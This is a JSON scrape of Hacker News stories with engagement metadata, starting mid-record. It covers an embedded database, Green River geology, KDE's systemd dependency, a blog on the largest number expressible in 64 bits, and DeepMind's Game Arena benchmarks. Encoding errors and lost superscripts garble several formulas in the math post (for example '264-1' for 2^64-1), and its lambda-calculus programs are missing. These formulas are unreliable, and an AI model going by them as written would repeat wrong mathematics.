      "impressions_likes": 39,
      "impressions_reposts": 0,
      "impressions_replies": 99,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:33.014051",
      "published_at": "2026-01-31T04:34:02",
      "scraped_at": "2026-02-03T09:02:33.014053",
      "metadata": {
        "item_type": "ask_hn",
        "hn_url": "https://news.ycombinator.com/item?id=46834977",
        "kids_count": 69,
        "sections": [
          "top_stories",
          "ask_hn"
        ]
      },
      "content_hash": "f010b3763ba453fd9ce68f8e9edf650e"
    },
    {
      "id": "51eee128dcd36f12729192b1d5b0c672",
      "source": "hackernews",
      "source_id": "46826454",
      "title": "Joedb, the Journal-Only Embedded Database",
      "content": "Joedb, the Journal-Only Embedded Database\n\nJoedb, the Journal-Only Embedded DatabaseÃ¯ÂƒÂ\n\n1. Introduction1.1. Pros and Cons1.2. An Example1.3. Concurrency Examples\n\n1.1. Pros and Cons\n\n1.2. An Example\n\n1.3. Concurrency Examples\n\n2. User Guide2.1. Getting Started2.2. Opening Files2.3. Checkpoints2.4. Concurrency2.5. Remote Procedure Call2.6. Schema Upgrade2.7. Vectors2.8. Indexes2.9. Blobs\n\n2.1. Getting Started\n\n2.2. Opening Files\n\n2.3. Checkpoints\n\n2.4. Concurrency\n\n2.5. Remote Procedure Call\n\n2.6. Schema Upgrade\n\n2.7. Vectors\n\n2.8. Indexes\n\n2.9. Blobs\n\n3. Reference3.1. API reference3.2. File Format3.3. Network Protocols3.4. Tools3.5. Testing3.6. Logging3.7. TODO3.8. Links3.9. Release Checklist3.10. History3.11. License\n\n3.1. API reference\n\n3.2. File Format\n\n3.3. Network Protocols\n\n3.4. Tools\n\n3.5. Testing\n\n3.6. Logging\n\n3.7. TODO\n\n3.8. Links\n\n3.9. Release Checklist\n\n3.10. History\n\n3.11. License",
      "url": "https://www.joedb.org/index.html",
      "author_username": "mci",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 79,
      "impressions_reposts": 0,
      "impressions_replies": 9,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:34.787894",
      "published_at": "2026-01-30T11:34:05",
      "scraped_at": "2026-02-03T09:02:34.787905",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46826454",
        "kids_count": 4,
        "sections": [
          "top_stories"
        ]
      },
      "content_hash": "a7e6859820ddf279f65f0d940261d7f1"
    },
    {
      "id": "7c5165053e39a82156ef768afd268639",
      "source": "hackernews",
      "source_id": "46858802",
      "title": "On being sane in insane places (1973) [pdf]",
      "content": "On being sane in insane places (1973) [pdf]",
      "url": "https://www.weber.edu/wsuimages/psychology/FacultySites/Horvat/OnBeingSaneInInsanePlaces.PDF",
      "author_username": "dbgrman",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 88,
      "impressions_reposts": 0,
      "impressions_replies": 48,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:44.677113",
      "published_at": "2026-02-02T12:43:14",
      "scraped_at": "2026-02-03T09:02:44.677141",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46858802",
        "kids_count": 15,
        "sections": [
          "top_stories"
        ]
      },
      "content_hash": "1be99805b0e4bca547acbf491c616a8d"
    },
    {
      "id": "72682de7406ddfc44a0f91d17a7df3f9",
      "source": "hackernews",
      "source_id": "46855803",
      "title": "Geologists may have solved mystery of Green River's 'uphill' route",
      "content": "February 2, 2026\n\nGeologists may have solved mystery of Green River's 'uphill' route\n\nbyUniversity of Glasgow\n\nedited byLisa Lock, \t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\treviewed byRobert Egan\n\nThis article has been reviewed according to ScienceÂ X'seditorial processandpolicies.Editorshave highlighted\n\t\t\t\t\t\t\t\t\t\t\t\t\t\tthe following attributes while ensuring the content's credibility:\n\nfact-checked\n\ntrusted source\n\nproofread\n\nNew research may have solved an American mystery which has baffled geologists for a century and a half: How did a river carve a path through a mountain in one of the country's most iconic landscapes? Scientists have long sought an answer to this question of how the Green River, the largest tributary of the Colorado River, managed to create a 700-meter-deep canyon through Utah's 4km-high Uinta Mountains instead of simply flowing around them. The question is particularly confounding because, while the Uinta Mountains are 50 million years old, the Green River has been following this route for less than 8 million years.\n\nNow, researchers from universities in the U.K. and the U.S. have gathered persuasive evidence that a phenomenon called \"lithospheric dripping,\" which causes mountains to subside and rebound over millions of years, is likely to be the cause of the Green River's unusual route.\n\nIn order to cut its surprising path through the Uinta Mountains, the Green River ran over land that was temporarily lowered when a lithospheric drip developed beneath the mountains several million years ago. During that time, the river eroded the mountain rock and established the channel it flows through today, including the famous Canyon of Lodore, which eventually linked it to the Colorado River.\n\nDr. Adam Smith, of the University of Glasgow's School of Geographical & Earth Sciences, is the lead author of the paper published in theJournal of Geophysical Research: Earth Surface. He said, \"The merging of the Green and Colorado Rivers millions of years ago altered the continental divide of North America. It created the line that separates the rivers that flow into the Pacific from those that flow into the Atlantic, and created new habitat boundaries for wildlife that influenced their evolution. It's an enormously significant area of the continent.\"\n\n\"For about 150 years now, geologists have debated over exactly how the rivers merged, which is a particularly challenging question for a tectonically inactive area where major geological events are rarer. We think that we've gathered enough evidence to show that lithospheric drip, which is still a relatively new concept in geology, is responsible for pulling the land down enough to enable the rivers to link and merge.\"\n\nLithospheric drips occur when dense, mineral-rich material forms at the base of the crust, eventually becoming heavy enough to sink into the mantle below. As they sink, they can drag down the land above them, pulling parts of mountain ranges downward.\n\nWhen the drip breaks off and continues to sink on its own, the mountain range rebounds, leaving behind a distinctive \"bullseye\"-patterned zone of uplift across the landscape above the drip's point of origin.\n\nIn the new paper, the team show how they used a combination of seismic imaging and sophisticated data modeling to reach their conclusion.Seismic imagingis a process similar to a CT scan which helps scientists \"see\" below the planet's surface by collecting data on how seismic waves move and are reflected during earthquakes. Researchers from University College London, the University of Utah, and the Utah Geological Survey contributed to the research and co-authored the paper.\n\nBy looking at previously published seismic imaging studies of the mountains, the team identified a cold, round anomaly about 200 km below the surface. This mass, which is between 50 and 100km across, is likely to be the broken-off section of the drip, the researchers say.\n\nBy estimating how far the drip had fallen and calculating the speed of its descent, the researchers estimate that the drip broke off between 2 and 5 million years ago. Their estimates match well with previous research that estimated the likely period of time during which the Green River cut through the mountains and integrated with the Colorado system.\n\nDiscover the latest in science, tech, and space with over100,000 subscriberswho rely on Phys.org for daily insights.\n        Sign up for ourfree newsletterand get updates on breakthroughs,\n        innovations, and research that matterâ€”daily or weekly.\n\nUsing modeling of the river networks, they identified and measured the bullseye pattern of uplift around the mountainsâ€”the telltale \"fingerprint\" of a lithospheric drip. They also found that the crust beneath the Uinta Mountains is several kilometers thinner than expected for a mountain range of its height, which the team say is consistent with dense lower-crustal material having dripped away. When they calculated the surface uplift expected from this missing material, it matched the roughly 400-plus-meter elevation change they had inferred from the river networks.\n\nDr. Smith added, \"This is a long paper, because we wanted not just to lay out the case for a lithospheric drip creating the route of the Green River but also to acknowledge some previous theories. The evidence we've collected strongly contradicts the idea that the river predated the mountains, or that sediment deposits might have built up enough for the river to overtop the range, or that erosion from the south of the mountains captured the Green River.\"\n\n\"We hope that this paper will help resolve a longstanding debate about one of North America's most significant river systems, and help build the growing body of evidence that lithospheric drips may be the hidden answer to more tectonic mysteries than we've previously realized.\"\n\nAdam Smith et al, A lithospheric drip triggered Green and Colorado River integration,Journal of Geophysical Research: Earth Surface(2026).\n\nProvided byUniversity of Glasgow",
      "url": "https://phys.org/news/2026-01-geologists-mystery-green-river-uphill.html",
      "author_username": "defrost",
      "author_category": "unknown",
      "media": [
        {
          "type": "image",
          "url": "https://scx0.b-cdn.net/pic/llock.jpg",
          "alt": ""
        },
        {
          "type": "image",
          "url": "https://scx0.b-cdn.net/pic/Robert.jpg",
          "alt": ""
        }
      ],
      "impressions_views": null,
      "impressions_likes": 157,
      "impressions_reposts": 0,
      "impressions_replies": 42,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:44.820128",
      "published_at": "2026-02-02T08:29:13",
      "scraped_at": "2026-02-03T09:02:44.820139",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46855803",
        "kids_count": 10,
        "sections": [
          "top_stories"
        ]
      },
      "content_hash": "391b7b6a5fe5c412e537712ba7cdee3c"
    },
    {
      "id": "d220b7240076ca160545cbd0a2979723",
      "source": "hackernews",
      "source_id": "46866385",
      "title": "Frog 'saunas' could help endangered species beat a deadly fungus (2024)",
      "content": "Frog 'saunas' could help endangered species beat a deadly fungus (2024)",
      "url": "https://www.science.org/content/article/frog-saunas-could-help-endangered-species-beat-deadly-fungus",
      "author_username": "noleary",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 21,
      "impressions_reposts": 0,
      "impressions_replies": 4,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:44.899982",
      "published_at": "2026-02-02T23:12:16",
      "scraped_at": "2026-02-03T09:02:44.899993",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46866385",
        "kids_count": 2,
        "sections": [
          "top_stories"
        ]
      },
      "content_hash": "0976de4d02a4d773d0333e3ec205d8bb"
    },
    {
      "id": "97819d6519425020c122590844157739",
      "source": "hackernews",
      "source_id": "46870596",
      "title": "KDE Binds Itself Tightly to Systemd, Drops Support for Non-Systemd Systems",
      "content": "The KDE desktopâ€™s new login manager (PLM) in the upcoming Plasma 6.6 will mark the first time that KDE requires that the underlying OS uses systemd, if one wishes for the full KDE experience. This has especially theFreeBSD community upset, but will also affect Linux distros that do not use systemd. The focus of the KDE team is clear, as stated in the referencedReddit thread, where a KDE developer replies that the goal is to rely on systemd for more tasks in the future. This means that PLM is just the first step.\n\nIn the eyes of KDE it seems that OSes that do not use systemd are â€˜nicheâ€™ and not worth supporting, with said niche Linux distros that would be cut outincludingeverything from Gentoo to Alpine Linux and Slackware. Regardless of your stance on systemdâ€™s merits or lack thereof, it would seem to be quite drastic for one of the major desktop environments across Linux and BSD to suddenly make this decision.\n\nIt also raises the question of in how far this is related to the pushtowards a distrolessand similarly more integrated, singular version of Linux as an operating system. Although there are still many other DEs that will happily run for the foreseeable future on your flavor of GNU/Linux or BSD â€“ regardless of whether youâ€™re more about about a System V or OpenRC init-style environment â€“ this might be one of the most controversial divides since systemd was first introduced.\n\nTop image: KDE Plasma 6.4.5. (Credit: Michio.kawaii,Wikimedia)",
      "url": "https://hackaday.com/2026/02/02/kde-binds-itself-tightly-to-systemd-drops-support-for-non-systemd-systems/",
      "author_username": "beardyw",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 3,
      "impressions_reposts": 0,
      "impressions_replies": 0,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:45.306408",
      "published_at": "2026-02-03T08:17:10",
      "scraped_at": "2026-02-03T09:02:45.306421",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46870596",
        "kids_count": 0,
        "sections": [
          "top_stories"
        ]
      },
      "content_hash": "136d0b77f9009d6a1dd4c32aa94a487f"
    },
    {
      "id": "b42d95fdc879727287cff933906f196a",
      "source": "hackernews",
      "source_id": "46859443",
      "title": "The largest number representable in 64 bits",
      "content": "The largest number representable in 64 bits\n\n28 Jan 2026\n\nThis post is a rewrite of my earlier blog post fromNov 2023with many new insights and updates.\n\nMost people believe 264-1 = 18446744073709551615, or\n0xFFFFFFFFFFFFFFFF in hexadecimal, to be the largest number\nrepresentable in 64 bits. In English, itâ€™s quite the mouthful: eighteen\nquintillion four hundred forty-six quadrillion seven hundred forty-four\ntrillion seventy-three billion seven hundred nine million five hundred\nfifty-one thousand six hundred fifteen.\n\nThat is indeed the maximum possible value of 64 bit unsigned integers,\navailable as data type uint64_t in C or u64 in Rust. \nFloating point data types can represent much larger values, courtesy of their base 2 exponent.\nThe 64-bit doublefloating\npoint formathas a largest (finite) representable value of 21024(1-2-53) ~ 1.8*10308.\n\nWhat if we allow representations beyond plain data types?\nSince we want representations to remain computable, the most general\nkind of representation would be a program in some programming language.\nBut the program must be small enough to fit in 64 bits.\n\nThe largest number programmable in 64 bits\n\nThe smallest possible valid C program is â€œmain(){}â€,\nconsisting of 8 ASCII characters.ASCIIis a 7-bit\ncharacter encoding standard representing 128 unique characters,\nbut all modern computers use 8-bit bytes to store either plain ASCII\norUTF-8, a Unicode character encoding thatâ€™s backward compatible with\nASCII.  So weâ€™ll consider the above all-scaffold do-nothing program to\nbe the only valid 64-bit C program.\n\nPlenty other languages require no such scaffolding. For instance,\nLinux features the arbitrary precision calculatorbc. It happily\ncomputes the 954242 digit number 9^999999 = 35908462â€¦48888889, making\nit programmable in 8 bytes. So is the much larger 9^9^9^99 =\n9^(9^(9^99)) with over 10^10^953 digits, which bc is less happy to\ncompute. If bc supported the symbolÂ ! for computing factorials, then\n9!!!!!!! would represent a much larger number still.\n\nAllowing such primitives feels a bit like cheating though. Would we allow a\nlanguage that has theAckerman functionpredefined, letting the 8 byte expression ack(9,9) represent a truly huge number?\n\nAckerman considered unhelpful\n\nAs it turns out, the question is moot.\nOne can blow way past ack(9,9) in under 64 bits in a language with no built\nin primitive whatsoever. A language with no basic arithmetic; not even numbers themselves.\nA language in which all those must be defined from scratch.\n\nBut letâ€™s first look at another primitives-lacking language, one that has been particularly\nwell studied for producing largest possible outputs. That is the language ofTuring machines.\n\nBusy Beaver\n\nThe famousBusy Beaverfunction,introducedbyTibor RadÃ³in 1962, which weâ€™ll\ndenote BB(n), is defined as the maximal number of steps taken by\nan n-state Turing Machine (TM) with a binary tape alphabet,\nstarting from an all 0 tape, before halting.\n\nHere we have a discrepancy between how the size of a TM is measured, in states,\nversus how program size is measured, in bits.\nFortunately there is a straightforward binary encoding of n-state TMs,\nwhich is entirely determined by its transition function.\nFor each of the n states that the machineâ€™s finite control can be in,\nand each of its 2 tape symbols that could be scanned by its tape head,\nthe transition function specifies what new symbol to write in the scanned tape cell (1 bit),\nwhether to move the tape head left or right (1 bit),\nand what new state (or special halt state) to transition to (âŒˆlog2(n+1)âŒ‰ bits).\nThis encoding takes 6*2*(2+3) = 60 bits for a a 6-state TM,\nand 7*2*(2+3) = 70 bits for a a 7-state TM.\n\nWeâ€™re also stretching the meaning of â€œrepresentableâ€ a bit,\nsince BB considers the runtime of the machine instead of its output.\nBesides the above BB (that RadÃ³ called S), RadÃ³ did define another\nfunction called Î£ that considers the output of the machine as a number in unary,\nnamely the number of 1s in the final tape contents. But BB has received\nmore attention as it allows one to determine from BB(n) all halting n-state machines.\nFor 6-states and up though, there is no discernable difference in magnitude between the two functions\nso we could have just as easily used Î£.\n\nSo the largest number TM programmable in 64 bits is BB(6).\n\nHow large is BB(6)?\n\nUnfortunately, we may never know. While all BB(n) have been determined (and even\nformally proven) for nâ‰¤5, there are some 6-state TMs whose halting behaviour are\nclosely related to very hard mathematical problems.\nMost of these so-calledcryptidsare likely not to halt, with some,\nlikeLucyâ€™s Moonlight,\nlikely to halt but unlikely to beat the current champion.\nThe current 6-state champion shows thatBB(6) > 2â†‘â†‘2â†‘â†‘2â†‘â†‘10.\nHere, mâ†‘â†‘n isKnuthâ€™s up-arrow notationfor an exponential tower of n mâ€™s, so that for example 2â†‘â†‘3 = 222.\nLarge as this number is, itâ€™s still very small compared to\nack(9,9) = 2â†‘712 - 3 = 2â†‘â†‘â†‘â†‘â†‘â†‘â†‘12 - 3.\n\nIt is known however thatBB(7) > 2â†‘112â†‘113 > ack(9,9).\nSeveral leading BB researchers believe that BB(7) is even larger than the famousGrahamâ€™s Number, which iterates\nthe function mapping n to 3â†‘n3 64 times starting from n=3.\nThis appears to me a rather bold belief, considering that the smallest known Graham exceeding TM has14 states, twice as many.\nSo I offered a $1000 bet that a proof of BB(7) > Grahamâ€™s Number wonâ€™t be found within 10 years,\nwhich BB researcherShawn Ligockiwas happy to accept.\n\nMeanwhile, Grahamâ€™s Number is easily surpassed within 64 bits, by moving beyond Turing machines\ninto the language of\n\nLambda Calculus\n\nAlonzo Church conceived theÎ»-calculusin about 1928 as a formal logic system for expressing\ncomputation based on function abstraction and application using variable binding and substitution.\n\nThe Graham beating lambda term originates in a Code Golf challenge asking for the\nâ€œShortest terminating program whose output size exceeds Grahamâ€™s numberâ€,answeredby userPatcailandfurther optimizedby user2014MELO03.\nThe following 49 bit program\n\nis theBinary Lambda Calculusencodingof the term\n\nwhere Î» (lambda) denotes an anonymous function, and number i is the variable bound by the i-th nested Î».\nThis is known asDe Bruijn notation, a\nway to avoid naming variables. A more conventional notation using variable names would be\n\nThe top left of this post shows agraphical representationof the term.\nThe last 16 bits of the program, making up almost a third of its size, encodes\nthe term Î»f Î»x. f (f x), which takes arguments f and x in turn, and iterates f twice on x.\nIn its generalized form, the function Î»f Î»x. fnx, \ncalled Church numeral n, is the most common way of representing numbers in the Î»-calculus.\nThe encoding of Church numeral n is 0000(01110)n10, of size 5n+6 bits.\n\nThe program, which weâ€™ll name after its discoverer, can be expressed more legibly as\n\nMelo evaluates to a Church numeral, â€œMeloâ€™s Numberâ€, that comfortably exceeds Grahamâ€™s Number.\n\nProof of exceeding Grahamâ€™s Number\n\nLemma 1. J J = 2â†‘â†‘6 HH 2, where HH denotes H H\n\nProof:\n\nJ J = J (J H) = J (H HH) = H HH (H HH H)\n    = H HH H        HH 2\n    = H HH 2        HH 2\n    = 2 HH 2        HH 2\n    = HH (HH 2)     HH 2\n    = HH 2 H 2      HH 2\n    = 2 H 2 H 2     HH 2\n    = H (H 2) H 2   HH 2\n    = H (H 2) 2 2   HH 2\n    = 2 (H 2) 2 2   HH 2\n    = H 2 (H 2 2) 2 HH 2\n    = H 2 2 2 2 2   HH 2\n    = 2 2 2 2 2 2   HH 2\n    = 2â†‘â†‘6          HH 2\n\nLemma 2. For k,n â‰¥ 2, k H 2 n > 3â†‘k(1+n)\n\nProof:\n\nBy induction on k.  First note that H2 n = H 2 n = n 2 2 = 2^2^n\n\nBase:   2 H 2 n = H H2 n = n H2 2 = 2â†‘â†‘(1+2n) > 3â†‘2(1+n)\n        already at n=2, since 2â†‘â†‘5 = 2^2^16 > 3^27 = 3â†‘â†‘3\nStep: k+1 H 2 n = H (k H 2) n = n (k H 2) 2 > 3â†‘k(1+ 3â†‘k(1+ â€¦\n3â†‘k(1+2)â€¦))\n                                            > 3â†‘k+1(1+n)\n\nLemma 3. For n â‰¥ 2, HH (HH n) > 3â†‘n3\n\nProof\n\nBy induction on n\n\nBase: Lemma 1â€™s proof shows HH (HH 2) = 2â†‘â†‘6 > 3{2</sup>3\nStep: HH (HH 1+n) = HH 1+n H 2 = 1+n H 2 H 2 = H (n H 2) H 2 =\nH (n H 2) 2 2 = 2 (n H 2) 2 2 = n H 2 (n H 2 2) 2 >Lm23â†‘n(1+3â†‘n(1+2)) 2 > 3â†‘n+13.\n\nTheorem: J J > Grahamâ€™s Number G(64), where G(n) = n (\\n -> 3â†‘n3) 4\n\nProof:\n\nJ J =Lm12â†‘â†‘6 HH 2 >Lm3(2â†‘â†‘6 / 2 - 1) (\\n -> 3â†‘n3)\n3â†‘23\n\n(2â†‘â†‘6 / 2 - 1) (\\n -> 3â†‘n3) 4 = G(2â†‘â†‘6 / 2 - 1) > G(64)\n\nLeaving Meloâ€™s Number in the dust\n\nWith 15 bits to spare, opportunities for vastly boosting Melo abound.\nDiscord users 50_ft_lock and Sam found the following term that extends Meloâ€™s H with an extra argument:\n\nwhich desugars to lambda term\n\nin conventional notation, or\n\nin de Bruijn notation, with 61-bit encoding\n\nLemma 4. T T T = 2â†‘â†‘18 A 2 2 2 2 2 2 2 2 2 2\n\nProof: Let AA denote A A\n\nThese 2â†‘â†‘18 iterations of A also let us relate its magnitude to the so-calledFast-growing hierarchy,\na family that assigns, to each ordinal Î±, a function [Î±] (diverting from the usual fÎ±notation for improved legibility) from natural numbers to natural numbers.\nWeâ€™ll treat all numbers as Church Numerals, so we can write n f instead of the\nusual fnand write f n instead of f(n) as normally done in Î»-calculus.\n\nReaders unfamiliar withordinalarithmetic,\nmay want to skip the next section.\n\nThe following FGH definition differs slightly from the standard one,\nwhich has the slightly slower growing [0] n = n+1 and [Î±+1] n = n [Î±] n.\nThis allows Lemma 5 to be exact rather than a mere lower bound.\n\nDefinition of Fast Growing Hierarchy\n\n[0] n = 2 n = n2\n\n[Î±+1] n = n 2 [Î±] 2 = A 2 [Î±] n\n\n[Ï‰i+1(Î±+1)] n = [Ï‰i+1Î±+Ï‰in] 2\n\nLemma 5. For kâ‰¥0, n>=2, : k+1 A 2 [Ï‰kÎ±] n = [Ï‰k(Î±+1)] n\n\nProof:\n\nBase k=0:\n0+1 A 2 [Ï‰0Î±] n = A 2 [Î±] n = n 2 [Î±] 2 = [Î±+1] n\n\nStep k>0:\nk+1 A 2 [Ï‰kÎ±] n = A (k A 2) [Ï‰kÎ±] n = n (k A 2) [Ï‰kÎ±] 2 = [Ï‰kÎ± + Ï‰k-1n] 2 = [Ï‰k(Î±+1)] n\n\nLemma 5 gives w218 = (2â†‘â†‘18 A 2 [0] 2) 2 2 2 2 2 2 2 = 2^2^2^2^2^2^2^([Ï‰2â†‘â†‘18-1] 2).\nIn comparison, Grahamâ€™s and Meloâ€™s Numbers are known to be much smaller at around [Ï‰+1] 64 and [Ï‰+1] (2â†‘â†‘6)\nrespectively.\n\nA Functional Busy Beaver\n\nThe Î»-calculus analogue to BB is:\n\nBBÎ»(n) = the maximum beta normal form size of any closed lambda",
      "url": "https://tromp.github.io/blog/2026/01/28/largest-number-revised",
      "author_username": "tromp",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 108,
      "impressions_reposts": 0,
      "impressions_replies": 78,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:45.692305",
      "published_at": "2026-02-02T13:31:36",
      "scraped_at": "2026-02-03T09:02:45.692318",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46859443",
        "kids_count": 23,
        "sections": [
          "top_stories"
        ]
      },
      "content_hash": "81bd9a9ce3726ce3e19ee7c879750b01"
    },
    {
      "id": "9bdd85dff64039885b2ef49fa4d4e150",
      "source": "hackernews",
      "source_id": "46858873",
      "title": "Advancing AI Benchmarking with Game Arena",
      "content": "Advancing AI benchmarking with Game Arena\n\nFeb 02, 2026\n\nDecisions in the real world are rarely based on the perfect information found on a chessboard. We are updating Kaggle Game Arena with two new games â€” Werewolf and poker â€” to benchmark how models navigate social dynamics and calculated risk.\n\nGeneral summary\n\nGoogle DeepMind is expanding its Game Arena platform to benchmark AI models in more complex scenarios. You can now test your models in Werewolf and poker in addition to chess. Watch live tournaments on Kaggle to see how the top models perform in these games.\n\nGoogle DeepMind is expanding its Game Arena platform to benchmark AI models in more complex scenarios. You can now test your models in Werewolf and poker in addition to chess. Watch live tournaments on Kaggle to see how the top models perform in these games.\n\nBullet points\n\nGoogle DeepMind's \"Game Arena\" article discusses using games to benchmark AI, moving beyond perfect information scenarios.Game Arena expands beyond chess to include Werewolf, testing social deduction and communication skills in AI models.A new poker benchmark assesses AI's ability to manage risk and quantify uncertainty in competitive scenarios.Watch live streams of AI competitions in poker, Werewolf, and chess with expert commentary on Kaggle.These benchmarks help develop safer AI by evaluating model behavior in complex, real-world-like environments.\n\nGoogle DeepMind's \"Game Arena\" article discusses using games to benchmark AI, moving beyond perfect information scenarios.\n\nGame Arena expands beyond chess to include Werewolf, testing social deduction and communication skills in AI models.\n\nA new poker benchmark assesses AI's ability to manage risk and quantify uncertainty in competitive scenarios.\n\nWatch live streams of AI competitions in poker, Werewolf, and chess with expert commentary on Kaggle.\n\nThese benchmarks help develop safer AI by evaluating model behavior in complex, real-world-like environments.\n\nBasic explainer\n\nGoogle DeepMind made a place called Game Arena to test how smart AI really is. They started with chess to see how well AI can plan ahead. Now, they're adding Werewolf and poker to test AI on things like social skills and risk-taking. These games help them see if AI can handle the real world's trickiness and work safely with people.\n\nGoogle DeepMind made a place called Game Arena to test how smart AI really is. They started with chess to see how well AI can plan ahead. Now, they're adding Werewolf and poker to test AI on things like social skills and risk-taking. These games help them see if AI can handle the real world's trickiness and work safely with people.\n\nGeneral summary\n\nBullet points\n\nBasic explainer\n\nYour browser does not support the audio element.\n\nChess is a game of perfect information. The real world is not.\n\nLast year, Google DeepMind partnered with Kaggle to launchGame Arena, an independent, public benchmarking platform where AI models compete in strategic games. We started with chess to measure reasoning and strategic planning. But in the real world, decisions are rarely based on complete information.\n\nTo build artificial intelligence capable of navigating this uncertainty, we need benchmarks that measure the modelâ€™s ability to reason in the face of ambiguity. This is why we are now expanding Game Arena with two new game benchmarks â€” Werewolf and poker â€” to test frontier models on social dynamics and calculated risk.\n\nGames have always been a core part of Google DeepMindâ€™s history, offering an objective proving ground where difficulty scales with the level of competition. As AI systems become more general, mastering diverse games demonstrates their consistency across distinct cognitive skills. Beyond measuring performance, games can also serve as controlled sandbox environments to evaluate agentic safety, providing insight into model behavior in the complex environments they will encounter when deployed in the real world.\n\nChess: reasoning over calculation\n\nWe released the chess benchmark last year to assess models on strategic reasoning, dynamic adaptation, and long-term planning by pitting them against one another in head-to-head chess games. To track how these model capabilities are evolving, we have updated theleaderboardto include the latest generation of models.\n\nWhile traditional chess engines like Stockfish function as specialized super-calculators, evaluating millions of positions per second to find the optimal move, large language models do not approach the game through brute-force calculation. Instead, they rely on pattern recognition and â€˜intuitionâ€™ to drastically reduce the search space â€” an approach that mirrors human play.\n\nGemini 3 Pro and Gemini 3 Flash currently have the top Elo ratings on the leaderboard. The modelsâ€™ internal â€˜thoughtsâ€™ reveal the use of strategic reasoning grounded in familiar chess concepts like piece mobility, pawn structure, and king safety. This significant performance increase over the Gemini 2.5 generation highlights the rapid pace of model progress and demonstrates Game Arenaâ€™s value in tracking these improvements over time.\n\nWerewolf: navigating social deduction\n\nMoving beyond the transparent logic of chess, we are expanding Kaggle Game Arena withWerewolf. This social deduction game is our first team-based game played entirely through natural language, requiring models to navigate the imperfect information in dialogue. In this social deduction challenge, a team of \"villagers\" must work together to distinguish truth from deception and identify the hidden \"werewolves\" to win.\n\nThis benchmark helps to assess the \"soft skills\" required for the next generation of AI assistants. The game tests communication, negotiation, and the ability to navigate ambiguity â€” the same capabilities agents need to collaborate effectively with humans and other agents in the enterprise world.\n\nWerewolf also serves as a secure environment for agentic safety research. Success involves playing both sides â€” the truth-seeker (villager) and the deceiver (werewolf). This allows us to test a model's ability to detect manipulation in others, while simultaneously red-teaming the modelâ€™s own capabilities around deception without the stakes of real-world deployment. This research is fundamental to building AI agents that act as reliable safeguards against bad actors.\n\nGemini 3 Pro and Gemini 3 Flash currently hold the top two positions on theleaderboard. They demonstrate the ability to effectively reason about the statements and actions of other players across multiple game rounds â€” for instance, identifying inconsistencies between a playerâ€™s public claims and their voting patterns â€” and use that insight to build consensus with teammates.\n\nFor a technical deep dive on how we measure model skill in Werewolf, head to theKaggle blog.\n\nPoker: the challenge of calculated risk\n\nChess relies on reasoning. Werewolf relies on social deduction. Poker introduces a new dimension: risk management. Like Werewolf, poker is a game of imperfect information. But here, the challenge isn't about building alliances â€” it's about quantifying uncertainty. Models must overcome the luck of the deal by inferring their opponents' hands and adapting to their playing styles to determine the best move.\n\nTo put these skills to the test, we are launching a new poker benchmark and hosting an AI poker tournament, where the top models will compete in Heads-Up No-Limit Texas Hold'em. The final poker leaderboard will be revealed atkaggle.com/game-arenaon Wednesday, Feb 4, following the conclusion of the tournament finals.\n\nTo learn how we evaluate model capability in poker, check out theKaggle blog.\n\nWatch the action\n\nMarking the launch of these new and updated benchmarks, we have partnered with Chess Grandmaster Hikaru Nakamura and poker legends Nick Schulman, Doug Polk, and Liv Boeree to produce three livestreamed events with expert commentary and analysis across all three benchmarks.\n\nTune in to the three daily livestreams at 9:30 AM PT atkaggle.com/game-arena:\n\nMonday, Feb 2:The top eight models on the poker leaderboard face off in the AI poker battle.\n\nTuesday, Feb 3:As the poker tournament semi-finals take place, we will also feature highlight matches from the Werewolf and chess leaderboards.\n\nWednesday, Feb 4:The final two models compete for the poker crown alongside the release of the full leaderboard. We conclude our coverage with a chess match between the top two models on the chess leaderboard â€” Gemini 3 Pro and Gemini 3 Flash â€” and will be streaming game highlights of the best Werewolf models.\n\nExplore the arena\n\nWhether itâ€™s finding a creative checkmate, negotiating a truce in Werewolf, or going all in at the poker table, Kaggle Game Arena is where we find out what these models can really do.\n\nCheck it out atkaggle.com/game-arena.",
      "url": "https://blog.google/innovation-and-ai/models-and-research/google-deepmind/kaggle-game-arena-updates/",
      "author_username": "salkahfi",
      "author_category": "unknown",
      "media": [
        {
          "type": "image",
          "url": "https://storage.googleapis.com/gweb-uniblog-publish-prod/images/orankelly.max-244x184.format-webp.webp",
          "alt": "orankelly"
        },
        {
          "type": "image",
          "url": "https://storage.googleapis.com/gweb-uniblog-publish-prod/images/kaggle_Gsmes_Hero.width-200.format-webp.webp",
          "alt": "An illustration of a King and Ace playing card, a wolf's head, two chess pieces, a poker chip, and other abstract shapes on a white background.1"
        },
        {
          "type": "image",
          "url": "https://storage.googleapis.com/gweb-uniblog-publish-prod/images/Terria-Clay_Collage_hero.width-300.format-webp.webp",
          "alt": ""
        }
      ],
      "impressions_views": null,
      "impressions_likes": 128,
      "impressions_reposts": 0,
